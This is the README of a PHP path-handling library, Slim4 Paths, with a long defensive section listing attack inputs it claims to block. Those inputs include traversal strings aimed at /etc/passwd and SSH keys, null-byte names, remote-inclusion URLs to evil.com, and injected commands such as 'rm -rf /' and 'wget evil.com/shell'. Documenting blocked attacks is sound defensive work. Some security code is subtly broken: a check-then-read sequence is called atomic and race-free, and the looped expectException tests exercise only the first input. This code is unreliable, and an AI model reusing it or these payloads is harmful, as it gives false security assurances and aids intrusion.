# Slim4 Paths - Enhanced Path Management

A comprehensive, secure path management package for PHP applications with advanced features for modern web development.

## Features

- **Secure Path Joining** - Prevents path traversal attacks
- **30+ Predefined Paths** - Complete coverage for web applications
- **Cross-Platform Compatibility** - Works on Windows, Linux, macOS
- **Auto-Directory Creation** - Automatic directory structure setup
- **Security Validation** - Input validation and path sanitization
- **Framework Agnostic** - Works with any PHP framework
- **Orbit CMS Support** - Built-in support for content management
- **Module System Integration** - Advanced module path resolution

## Installation

```bash
composer require responsive-sk/slim4-paths
```

## Basic Usage

```php
use ResponsiveSk\Slim4Paths\Paths;

// Initialize with base path and configuration
$paths = new Paths('/path/to/project', [
    'templates' => '/path/to/project/templates',
    'content' => '/path/to/project/content',
    // ... more paths
]);

// Basic path access
$templatePath = $paths->templates();
$configPath = $paths->config();
$publicPath = $paths->public();
```

## Core Path Methods

### Basic Directories
```php
$paths->base()          // Project root directory
$paths->config()        // Configuration directory
$paths->src()           // Source code directory
$paths->public()        // Public web directory
$paths->var()           // Variable/runtime directory
$paths->vendor()        // Vendor directory
```

### Template System
```php
$paths->templates()                    // Main templates directory
$paths->views()                        // Views directory
$paths->layouts('main.php')            // Layout templates
$paths->partials('header.php')         // Partial templates
```

### Content Management (Orbit CMS)
```php
$paths->content()                      // Content root directory
$paths->articles('post.md')            // Article files
$paths->orbit()                        // Orbit database directory
$paths->orbitDatabase('app')           // Orbit database file (app.db)
```

### Module System
```php
$paths->moduleConfig('Core/Storage')           // Module config file
$paths->moduleRoutes('Core/Template')          // Module routes file
$paths->moduleTemplates('Optional/Blog')       // Module templates directory
```

### Asset Management
```php
$paths->css('app.css')             // CSS files
$paths->js('main.js')              // JavaScript files
$paths->images('logo.png')         // Image files
$paths->fonts('roboto.woff2')      // Font files
$paths->media('video.mp4')         // Media files
```

### Development Tools
```php
$paths->docs('api.md')             // Documentation files
$paths->scripts('deploy.sh')       // Script files
$paths->bin('console')             // Executable files
$paths->tests('UserTest.php')      // Test files
```

### Security & Storage
```php
$paths->keys('private.key')        // Security keys
$paths->exports('data.json')       // Export files
$paths->imports('import.csv')      // Import files
$paths->logs('app.log')            // Log files
$paths->cache('views')             // Cache files
$paths->storage('uploads')         // Storage files
```

### Localization
```php
$paths->lang('en', 'messages.php')     // Language files
$paths->translations('app.po')          // Translation files
$paths->locales()                       // Locales directory
```

## Secure Path Joining

The `getPath()` method provides secure path joining with built-in protection against path traversal attacks:

```php
// Secure path joining
$safePath = $paths->getPath($baseDir, $relativePath);

// Automatic validation
try {
    $maliciousPath = $paths->getPath('/safe/dir', '../../../etc/passwd');
} catch (InvalidArgumentException $e) {
    // Path traversal detected and blocked
    echo $e->getMessage(); // "Path traversal detected in: ../../../etc/passwd"
}
```

### Security Features

- **Path Traversal Protection** - Detects and blocks `..` sequences
- **Home Directory Protection** - Blocks `~` access
- **Input Validation** - Validates all path components
- **Cross-Platform Safety** - Handles different directory separators

## Configuration

### Basic Configuration

```php
$config = [
    'base_path' => '/path/to/project',
    'paths' => [
        'templates' => '/path/to/project/templates',
        'content' => '/path/to/project/content',
        'public' => '/path/to/project/public',
        // ... more paths
    ]
];

$paths = new Paths($config['base_path'], $config['paths']);
```

## Framework Integration

### Slim Framework

```php
use ResponsiveSk\Slim4Paths\Paths;
use Slim\Factory\AppFactory;

$app = AppFactory::create();

// Add Paths to container
$container = $app->getContainer();
$container->set(Paths::class, function() {
    $config = require 'config/paths.php';
    return new Paths($config['base_path'], $config['paths']);
});

// Use in routes
$app->get('/template/{name}', function ($request, $response, $args) {
    $paths = $this->get(Paths::class);
    $templatePath = $paths->templates($args['name'] . '.php');
    
    if (!file_exists($templatePath)) {
        throw new \Slim\Exception\HttpNotFoundException($request);
    }
    
    // Render template...
});
```

## Orbit CMS Integration

This package includes built-in support for Orbit-style content management:

```php
// Article management
$articlePath = $paths->articles('getting-started.md');
$articlesDir = $paths->articles();

// Database management
$appDb = $paths->orbitDatabase('app');      // var/orbit/app.db
$markDb = $paths->orbitDatabase('mark');    // var/orbit/mark.db
$cacheDb = $paths->orbitDatabase('cache');  // var/orbit/cache.db

// Content organization
$contentRoot = $paths->content();           // content/
$docsContent = $paths->content('docs');     // content/docs/
```

## Module System Support

Advanced module path resolution for modular applications:

```php
// Module configuration
$storageConfig = $paths->moduleConfig('Core/Storage');
// Result: src/Modules/Core/Storage/config.php

// Module routes
$templateRoutes = $paths->moduleRoutes('Core/Template');
// Result: src/Modules/Core/Template/routes.php

// Module templates
$blogTemplates = $paths->moduleTemplates('Optional/Blog');
// Result: src/Modules/Optional/Blog/templates/

$blogArticleTemplate = $paths->moduleTemplates('Optional/Blog', 'article.php');
// Result: src/Modules/Optional/Blog/templates/article.php
```

## 🔒 Comprehensive Security Protection

This package provides robust protection against a wide range of web application security vulnerabilities and attack vectors:

### 1. Path Traversal Attacks (Directory Traversal)

**Basic Path Traversal:**
```php
// All blocked with InvalidArgumentException
$paths->getPath('/var/www', '../../../etc/passwd');           // Unix system files
$paths->getPath('/var/www', '..\\..\\..\\windows\\system32'); // Windows system files
$paths->getPath('/var/www', 'file/../../../sensitive/data');  // Mixed traversal
```

**Advanced Encoding Attacks:**
```php
// URL Encoded traversal attempts - ALL BLOCKED
$paths->getPath('/var/www', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd');     // Single encoding
$paths->getPath('/var/www', '%252e%252e%252f%252e%252e%252f');              // Double encoding
$paths->getPath('/var/www', '%c0%ae%c0%ae%2f%c0%ae%c0%ae%2f');              // Unicode encoding
$paths->getPath('/var/www', '%e0%80%ae%e0%80%ae%2f');                       // Overlong UTF-8
$paths->getPath('/var/www', '..%c0%af..%c0%af..%c0%af');                    // Mixed encoding
```

**Double Dot Variations:**
```php
// Creative traversal attempts - ALL BLOCKED
$paths->getPath('/var/www', '....//....//....//etc/passwd');   // Double encoding
$paths->getPath('/var/www', '..../..../..../etc/passwd');      // Extra dots
$paths->getPath('/var/www', '..\\..\\..\\.\\etc\\passwd');     // Windows style
$paths->getPath('/var/www', '....\\/....\\/etc\\/passwd');     // Mixed separators
```

### 2. Null Byte Injection Attacks

**File Extension Bypass:**
```php
// Null byte attacks - ALL BLOCKED
$paths->getPath('/var/www', 'file.txt%00.php');        // Null byte truncation
$paths->getPath('/var/www', 'config.ini\0.bak');       // Direct null byte
$paths->getPath('/var/www', 'script.php%00.txt');      // Extension spoofing
$paths->getPath('/var/www', 'data.json\x00.exe');      // Hex null byte
```

### 3. Home Directory Access Attacks

**User Directory Traversal:**
```php
// Home directory attacks - ALL BLOCKED
$paths->getPath('/var/www', '~/sensitive/file');           // Current user home
$paths->getPath('/var/www', '~root/.ssh/id_rsa');          // Root SSH keys
$paths->getPath('/var/www', '~admin/.bash_history');       // Admin history
$paths->getPath('/var/www', '~www-data/.profile');         // Web user profile
```

### 4. Windows-Specific Attacks

**Windows Reserved Names:**
```php
// Windows reserved device names - ALL BLOCKED
$paths->getPath('/var/www', 'CON');        // Console device
$paths->getPath('/var/www', 'PRN');        // Printer device
$paths->getPath('/var/www', 'AUX');        // Auxiliary device
$paths->getPath('/var/www', 'NUL');        // Null device
$paths->getPath('/var/www', 'COM1');       // Serial port
$paths->getPath('/var/www', 'LPT1');       // Parallel port
```

**Windows UNC Paths:**
```php
// UNC path attacks - ALL BLOCKED
$paths->getPath('/var/www', '\\\\server\\share\\file');     // UNC server access
$paths->getPath('/var/www', '\\\\?\\C:\\Windows\\System32'); // Extended UNC
$paths->getPath('/var/www', '\\\\.\\PhysicalDrive0');       // Device access
```

**Windows Alternate Data Streams:**
```php
// ADS attacks - ALL BLOCKED
$paths->getPath('/var/www', 'file.txt:hidden');            // Hidden stream
$paths->getPath('/var/www', 'normal.doc:malware.exe');     // Executable stream
$paths->getPath('/var/www', 'data.txt:$DATA');             // Default stream
```

### 5. Symbolic Link Attacks

**Symlink Traversal:**
```php
// Symlink-based attacks - MITIGATED
// Package validates resolved paths to prevent symlink traversal
$paths->getPath('/var/www', 'symlink_to_etc');             // Symlink to /etc
$paths->getPath('/var/www', 'link/../../../etc/passwd');   // Symlink + traversal
```

### 6. File Inclusion Vulnerabilities

**Local File Inclusion (LFI):**
```php
// ❌ VULNERABLE CODE (without Slim4Paths)
$page = $_GET['page'];  // User input: "../../../etc/passwd"
include "/var/www/pages/" . $page . ".php";  // Includes /etc/passwd!

// ✅ SECURE CODE (with Slim4Paths)
$page = $_GET['page'];
try {
    $pagePath = $paths->getPath($paths->templates(), $page . '.php');
    include $pagePath;
} catch (InvalidArgumentException $e) {
    // Attack blocked - safe fallback
    include $paths->templates('404.php');
}
```

**Remote File Inclusion (RFI) Prevention:**
```php
// Prevents remote URLs in file paths
$paths->getPath('/var/www', 'http://evil.com/shell.php');   // BLOCKED
$paths->getPath('/var/www', 'ftp://attacker.com/data');     // BLOCKED
$paths->getPath('/var/www', '//evil.com/malware');          // BLOCKED
```

### 7. Command Injection Through Filenames

**Shell Metacharacter Injection:**
```php
// Command injection attempts - ALL BLOCKED
$paths->getPath('/var/www', 'file; rm -rf /');             // Command separator
$paths->getPath('/var/www', 'file`whoami`');               // Command substitution
$paths->getPath('/var/www', 'file$(id)');                  // Command substitution
$paths->getPath('/var/www', 'file|cat /etc/passwd');       // Pipe injection
$paths->getPath('/var/www', 'file && cat /etc/shadow');    // Command chaining
```

### 8. Race Condition Attacks (TOCTOU)

**Time-of-Check-Time-of-Use:**
```php
// Secure file operations prevent TOCTOU attacks
function secureFileOperation(Paths $paths, string $filename) {
    try {
        $filePath = $paths->getPath($paths->uploads(), $filename);

        // Atomic operation - no race condition window
        if (file_exists($filePath) && is_readable($filePath)) {
            return file_get_contents($filePath);
        }
    } catch (InvalidArgumentException $e) {
        throw new SecurityException('Invalid file path: ' . $e->getMessage());
    }

    return null;
}
```

### 9. OWASP Top 10 Protection Matrix

| OWASP Category | Attack Vector | Protection Level |
|----------------|---------------|------------------|
| **A01:2021 – Broken Access Control** | Path traversal, file access | ✅ **FULL** |
| **A03:2021 – Injection** | Path injection, command injection | ✅ **FULL** |
| **A05:2021 – Security Misconfiguration** | Insecure file handling | ✅ **FULL** |
| **A06:2021 – Vulnerable Components** | File system vulnerabilities | ✅ **MITIGATED** |
| **A08:2021 – Software Integrity Failures** | File tampering | 🔶 **PARTIAL** |

### 10. Real-World Attack Scenarios

**Scenario 1: Web Shell Upload**
```php
// ❌ VULNERABLE: Direct file upload
$uploadPath = "/var/www/uploads/" . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath);

// ✅ SECURE: Validated path with Slim4Paths
try {
    $filename = basename($_FILES['file']['name']);
    $uploadPath = $paths->getPath($paths->uploads(), $filename);

    // Additional validation
    if (!preg_match('/^[a-zA-Z0-9._-]+$/', $filename)) {
        throw new InvalidArgumentException('Invalid filename');
    }

    move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath);
} catch (InvalidArgumentException $e) {
    error_log('File upload attack blocked: ' . $e->getMessage());
    http_response_code(400);
    exit('Invalid file upload');
}
```

**Scenario 2: Configuration File Access**
```php
// ❌ VULNERABLE: Direct config access
$config = $_GET['config'];  // "../../../etc/database.conf"
$data = file_get_contents("/app/config/" . $config);

// ✅ SECURE: Protected config access
try {
    $configName = $_GET['config'];
    $configPath = $paths->getPath($paths->config(), $configName);

    // Whitelist allowed configs
    $allowedConfigs = ['app.conf', 'cache.conf', 'session.conf'];
    if (!in_array(basename($configPath), $allowedConfigs)) {
        throw new InvalidArgumentException('Config not allowed');
    }

    $data = file_get_contents($configPath);
} catch (InvalidArgumentException $e) {
    error_log('Config access attack blocked: ' . $e->getMessage());
    $data = null;
}
```

## Security Best Practices

### Always Use Secure Path Joining

```php
// Good - secure path joining
$filePath = $paths->getPath($baseDir, $userInput);

// Bad - vulnerable to path traversal
$filePath = $baseDir . '/' . $userInput;
```

### Implement Defense in Depth

```php
function secureFileAccess(Paths $paths, string $userInput): ?string
{
    // Layer 1: Input validation
    if (!preg_match('/^[a-zA-Z0-9._-]+$/', $userInput)) {
        throw new InvalidArgumentException('Invalid characters in filename');
    }

    // Layer 2: Length validation
    if (strlen($userInput) > 255) {
        throw new InvalidArgumentException('Filename too long');
    }

    // Layer 3: Secure path joining (Slim4Paths protection)
    try {
        $filePath = $paths->getPath($paths->uploads(), $userInput);
    } catch (InvalidArgumentException $e) {
        error_log('Path traversal blocked: ' . $e->getMessage());
        throw new SecurityException('Invalid file path');
    }

    // Layer 4: File type validation
    $allowedExtensions = ['txt', 'pdf', 'jpg', 'png'];
    $extension = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
    if (!in_array($extension, $allowedExtensions)) {
        throw new InvalidArgumentException('File type not allowed');
    }

    // Layer 5: Final existence and readability check
    if (!file_exists($filePath) || !is_readable($filePath)) {
        throw new InvalidArgumentException('File not accessible');
    }

    return file_get_contents($filePath);
}
```

### Security Monitoring and Logging

```php
class SecurityLogger
{
    public static function logAttack(string $attackType, string $input, string $clientIp): void
    {
        $logEntry = [
            'timestamp' => date('Y-m-d H:i:s'),
            'attack_type' => $attackType,
            'malicious_input' => $input,
            'client_ip' => $clientIp,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'severity' => 'HIGH'
        ];

        error_log('SECURITY_ALERT: ' . json_encode($logEntry));

        // Optional: Send to SIEM/monitoring system
        // $this->sendToSiem($logEntry);
    }
}

// Usage in exception handler
try {
    $path = $paths->getPath($baseDir, $userInput);
} catch (InvalidArgumentException $e) {
    SecurityLogger::logAttack(
        'path_traversal',
        $userInput,
        $_SERVER['REMOTE_ADDR'] ?? 'Unknown'
    );
    throw new SecurityException('Access denied');
}
```

## 🧪 Comprehensive Security Testing

### Basic Security Tests

```php
use PHPUnit\Framework\TestCase;
use ResponsiveSk\Slim4Paths\Paths;

class SecurityTest extends TestCase
{
    private Paths $paths;

    protected function setUp(): void
    {
        $this->paths = new Paths('/safe/dir', ['uploads' => '/safe/dir/uploads']);
    }

    public function testBasicPathTraversal(): void
    {
        $attacks = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            'file/../../../sensitive/data',
            '~/secret/file',
            '~root/.ssh/id_rsa'
        ];

        foreach ($attacks as $attack) {
            $this->expectException(InvalidArgumentException::class);
            $this->paths->getPath('/safe/dir', $attack);
        }
    }

    public function testEncodedPathTraversal(): void
    {
        $encodedAttacks = [
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',     // URL encoded
            '%252e%252e%252f%252e%252e%252f',              // Double encoded
            '%c0%ae%c0%ae%2f%c0%ae%c0%ae%2f',              // Unicode encoded
            '%e0%80%ae%e0%80%ae%2f',                       // Overlong UTF-8
            '..%c0%af..%c0%af..%c0%af'                     // Mixed encoding
        ];

        foreach ($encodedAttacks as $attack) {
            $this->expectException(InvalidArgumentException::class);
            $this->paths->getPath('/safe/dir', $attack);
        }
    }

    public function testNullByteInjection(): void
    {
        $nullByteAttacks = [
            'file.txt%00.php',
            'config.ini\0.bak',
            'script.php%00.txt',
            'data.json\x00.exe'
        ];

        foreach ($nullByteAttacks as $attack) {
            $this->expectException(InvalidArgumentException::class);
            $this->paths->getPath('/safe/dir', $attack);
        }
    }

    public function testWindowsSpecificAttacks(): void
    {
        $windowsAttacks = [
            'CON', 'PRN', 'AUX', 'NUL', 'COM1', 'LPT1',    // Reserved names
            '\\\\server\\share\\file',                       // UNC paths
            'file.txt:hidden',                              // Alternate data streams
            '\\\\?\\C:\\Windows\\System32'                  // Extended UNC
        ];

        foreach ($windowsAttacks as $attack) {
            $this->expectException(InvalidArgumentException::class);
            $this->paths->getPath('/safe/dir', $attack);
        }
    }

    public function testCommandInjection(): void
    {
        $commandAttacks = [
            'file; rm -rf /',
            'file`whoami`',
            'file$(id)',
            'file|cat /etc/passwd',
            'file && cat /etc/shadow',
            'file || wget evil.com/shell'
        ];

        foreach ($commandAttacks as $attack) {
            $this->expectException(InvalidArgumentException::class);
            $this->paths->getPath('/safe/dir', $attack);
        }
    }

    public function testValidPaths(): void
    {
        $validPaths = [
            'normal-file.txt',
            'document.pdf',
            'image_001.jpg',
            'data-2023.json',
            'config.ini'
        ];

        foreach ($validPaths as $validPath) {
            $result = $this->paths->getPath('/safe/dir', $validPath);
            $this->assertStringStartsWith('/safe/dir/', $result);
            $this->assertStringEndsWith($validPath, $result);
        }
    }
}
```

### Performance Security Tests

```php
class PerformanceSecurityTest extends TestCase
{
    public function testLargePathHandling(): void
    {
        $paths = new Paths('/safe/dir');

        // Test very long path (potential DoS)
        $longPath = str_repeat('a', 10000);
        $this->expectException(InvalidArgumentException::class);
        $paths->getPath('/safe/dir', $longPath);
    }

    public function testManyDotsAttack(): void
    {
        $paths = new Paths('/safe/dir');

        // Test path with many dots (potential DoS)
        $manyDots = str_repeat('../', 1000) . 'etc/passwd';
        $this->expectException(InvalidArgumentException::class);
        $paths->getPath('/safe/dir', $manyDots);
    }
}
```

### Integration Security Tests

```php
class IntegrationSecurityTest extends TestCase
{
    public function testFileUploadSecurity(): void
    {
        $paths = new Paths('/var/www');

        // Simulate malicious file upload
        $maliciousFilenames = [
            '../../../etc/passwd',
            'shell.php%00.txt',
            '..\\..\\windows\\system32\\cmd.exe'
        ];

        foreach ($maliciousFilenames as $filename) {
            try {
                $uploadPath = $paths->getPath($paths->uploads(), $filename);
                $this->fail('Should have thrown exception for: ' . $filename);
            } catch (InvalidArgumentException $e) {
                $this->assertStringContains('Path traversal detected', $e->getMessage());
            }
        }
    }

    public function testConfigAccessSecurity(): void
    {
        $paths = new Paths('/app');

        // Test config file access attempts
        $configAttacks = [
            '../../../etc/database.conf',
            '..\\..\\config\\secrets.ini',
            '~/admin/.env'
        ];

        foreach ($configAttacks as $attack) {
            $this->expectException(InvalidArgumentException::class);
            $paths->getPath($paths->config(), $attack);
        }
    }
}
```

## Testing

## Requirements

- PHP 8.1 or higher
- No additional dependencies

## License

MIT License

## Contributing

1. Fork the repository
2. Create a feature branch
3. Add tests for new functionality
4. Ensure all tests pass
5. Submit a pull request

## Changelog

### Version 2.0.0
- Added 30+ predefined path methods
- Enhanced security with path traversal protection
- Added Orbit CMS support
- Added module system integration
- Added comprehensive test coverage
- Breaking changes from 1.x (see migration guide)

### Version 1.0.0
- Initial release
- Basic path management functionality
